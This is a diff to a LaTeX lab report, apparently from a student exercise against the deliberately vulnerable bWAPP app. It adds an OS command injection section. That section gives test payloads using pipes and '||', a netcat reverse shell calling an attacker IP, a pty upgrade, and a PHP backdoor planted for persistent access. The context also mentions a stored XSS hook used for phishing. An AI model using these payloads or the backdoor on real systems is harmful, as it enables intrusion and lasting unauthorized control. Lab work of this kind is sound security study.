@@ -136,8 +136,8 @@ We are going to exploit the vulnerability CWE-79: Stored XSS.
 \textcolor{magenta}{This section should include test design for all team members.}
 
 
-For the XSS - Stored (Blog) path
-TODO: test design tehnique?
+\subsection{XSS - Stored (Blog)}
+TODO: test design tehnique? Adauga fotografie
 \begin{table} [htpb]
     \centering
     \begin{tabular}{l|l|l|l|l}
@@ -148,6 +148,33 @@ TODO: test design tehnique?
     \end{tabular}
     \caption{\label{tab:TC-XSS}TCs XSS table.}
 \end{table}
+
+\subsection{OS Command Injection}
+TODO: test design tehnique?
+Using the knowledge that the server is goind to ping the ip address provided, we can check if the server is vulnerable for OS Command Inject.
+We will test on medium difficulty.
+Because the output of our command is not shown, this is trickier. One way to get around this is to try to execute the command sleep 5.
+If the server waits 5 seconds before sending a response, we know that we managed to inject our command.
+
+\begin{table} [htpb]
+    \centering
+    \begin{tabular}{l|l|l|l|l}
+        Feature & TC ID & Input                  & Expected Output        & Output                 \\ \hline
+        F001    & TC01  & 127.0.0.1              & Immediately Terminates & Immediately Terminates \\
+        F002    & TC02  & 127.0.0.1; sleep 5     & Immediately Terminates & Immediately Terminates \\
+        F003    & TC03  & 127.0.0.1 \&\& sleep 5 & Immediately Terminates & Immediately Terminates \\
+        F004    & TC04  & 127.0.0.1 || sleep 5   & Immediately Terminates & Immediately Terminates \\
+        F005    & TC05  & 127.0.0.0 || sleep 5   & Immediately Terminates & Waits ~5 seconds       \\
+        F006    & TC06  & || sleep 5             & Immediately Terminates & Waits ~5 seconds       \\
+        F007    & TC07  & 127.0.0.1 | sleep 5    & Immediately Terminates & Waits ~5 seconds       \\
+    \end{tabular}
+    \caption{\label{tab:TC-command-injection}TCs OS Command Injection table.}
+\end{table}
+
+As we can see in the table \ref{tab:TC-command-injection}, it seems that only the \& and ; caracters are escaped/removed and we can still exploit it using the "|" caracter.
+We can either create an or command with "||". Because of lazy evaluation, the second command will be evaluated only if the first command failed.
+We can make the command fail if we don't suply an argument or an invalid one.
+The other way we can inject a command is with the pipe operator, which works regardles of if the first command ends with success or failure.
 
 
 \section{Vulnerability Exploit}
@@ -184,7 +211,7 @@ When a user sees the comment section, we get a lot of informations about them, l
 \begin{figure}
     \centering
     \includegraphics[width=1\linewidth]{Figures/beef/inject-hook.png}
-    \caption{\label{fig:inject-hook}Injecting te=he javascript hook into the website}
+    \caption{\label{fig:inject-hook}Injecting the javascript hook into the website}
 \end{figure}
 
 \begin{figure}
@@ -217,6 +244,47 @@ When the user presses log in, the data is send to the attacker and the phishing 
     \caption{\label{fig:data-received}The collected data from the user}
 \end{figure}
 
+\subsection{OS Command Injection}
+So far we have tried to run a sleep command to check if the payload works. Now that we know that it does, we can exploit it.
+We can get a reverse shell using the command nc <attacker\_ip> <attacker\_port> -e /bin/bash.
+In our case, nc 10.0.2.15 4747 -e /bin/bash.
+
+So the full payload, in our case is 127.0.0.1|nc 10.0.2.15 4747 -e /bin/bash.
+
+Before sending this payload, we run on the attacker host the command nc -lvp 4747 to listen for incoming connections.
+
+After the payload is send, we can see a new connection and we have access to the host terminal.
+Because the host also has python installed, we can easily turn this into an interactive terminal running the command python -c "import pty; pty.spawn('/bin/bash')"
+\ref{fig:inject-code}
+\begin{figure}
+    \centering
+    \includegraphics[width=1\linewidth]{Figures/command-injection/inject-code.png}
+    \caption{\label{fig:inject-code}The injected code}
+\end{figure}
+
+In case this vulnerability gets fixed, we can now install a backdoor into the server so we will still have access to it.
+For this, we will insert a php script that gives a reverse shell.\ref{php:backdoor}
+
+\begin{lstlisting}[language=php,caption={Backdoor Code},label=php:backdoor]
+<?php
+exec("nc " . $_GET["server"] . " " . $_GET["port"] . " -e /bin/bash");"
+\end{lstlisting}
+
+And we can write this backdoor using our reversed shell.
+\begin{lstlisting}[language=bash,caption={Backdoor Code in bash},label=bash:backdoor]
+echo "<?php
+exec(\"nc \".\$_GET[\"server\"].\" \".\$_GET[\"port\"].\" -e /bin/bash\");"
+\end{lstlisting}
+
+We piped the command \ref{bash:backdoor} into the file inserted\_backdoor.php and now when we acces the url "http://10.0.2.4/bWAPP/inserted\_backdoor.php?server=10.0.2.15 \&port=4747",
+the server will give us a reverse shell. \ref{fig:backdoor-installed}
+
+\begin{figure}
+    \centering
+    \includegraphics[width=1\linewidth]{Figures/command-injection/backdoor-installed.png}
+    \caption{\label{fig:backdoor-installed}How to connect to the server after the backdoor has installed}
+\end{figure}
+
 \subsection{Manual Exploit}
 \label{}
 
@@ -247,7 +315,7 @@ When the user presses log in, the data is send to the attacker and the phishing 
 To find out how we can remediat this attack, we need to see the source code.
 
 
-\begin{lstlisting}[caption={XSS Code},label=php:xss-attack]
+\begin{lstlisting}[language=php, caption={XSS Code},label=php:xss-attack]
 while($row = $recordset->fetch_object())
 {
 
